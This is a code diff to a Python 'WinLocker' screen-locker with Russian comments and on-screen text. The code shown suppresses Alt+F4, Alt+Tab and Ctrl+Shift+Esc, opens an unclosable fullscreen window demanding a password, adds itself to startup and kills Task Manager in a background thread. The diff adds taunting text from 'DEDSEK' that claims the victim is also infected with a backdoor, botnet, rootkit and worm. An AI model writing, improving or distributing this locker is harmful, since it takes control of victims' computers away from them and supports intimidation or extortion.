@@ -12,7 +12,6 @@ def block_input(block=True):
 def block_all_keys():
     try:
         import keyboard
-        # Блокируем все возможные комбинации
         keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
         keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
         keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
@@ -71,7 +70,6 @@ class WinLocker:
         self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # Основной Canvas
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
@@ -93,11 +91,26 @@ class WinLocker:
         )
         self.canvas.create_text(50, 550, text=scary_text, fill='white', font=('Courier', 14), anchor='sw')
         
-        # Поле ввода МАКСИМАЛЬНО ВНИЗУ, прямо над страшным текстом
-        self.canvas.create_text(200, 400, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28), anchor='w')
+        # Новые угрожающие надписи от DEDSEK (справа)
+        dedsek_text = (
+            "DeDsEk тебя приветствует\n"
+            "не надо было ничего скачивать\n"
+            "из непроверенных источников\n\n"
+            "DEDSEK тебя видит\n\n"
+            "кстати это еще не один вирус\n"
+            "у тебя от меня есть:\n"
+            "- Бекдор\n"
+            "- Ботнет\n"
+            "- Руткит\n"
+            "- Червяк такой жирный"
+        )
+        self.canvas.create_text(750, 400, text=dedsek_text, fill='white', font=('Courier', 16), anchor='e')
+        
+        # Поле ввода МАКСИМАЛЬНО СПРАВА И ВНИЗУ
+        self.canvas.create_text(700, 500, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28), anchor='e')
         self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
-        self.canvas.create_window(200, 450, window=self.entry, anchor='w')
-        self.status = self.canvas.create_text(200, 500, text="", fill='white', font=('Courier', 20), anchor='w')
+        self.canvas.create_window(700, 540, window=self.entry, anchor='e')
+        self.status = self.canvas.create_text(700, 580, text="", fill='white', font=('Courier', 20), anchor='e')
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
@@ -117,9 +130,8 @@ class WinLocker:
 
 # === ЗАПУСК ===
 if __name__ == "__main__":
-    # Если скрипт уже в автозагрузке, таймер не нужен
     if os.path.basename(sys.argv[0]) != "winlocker.py":
-        TIMER_SECONDS = 0  # Мгновенная активация после перезагрузки
+        TIMER_SECONDS = 0
     
     add_to_startup()
     threading.Thread(target=kill_taskmgr, daemon=True).start()
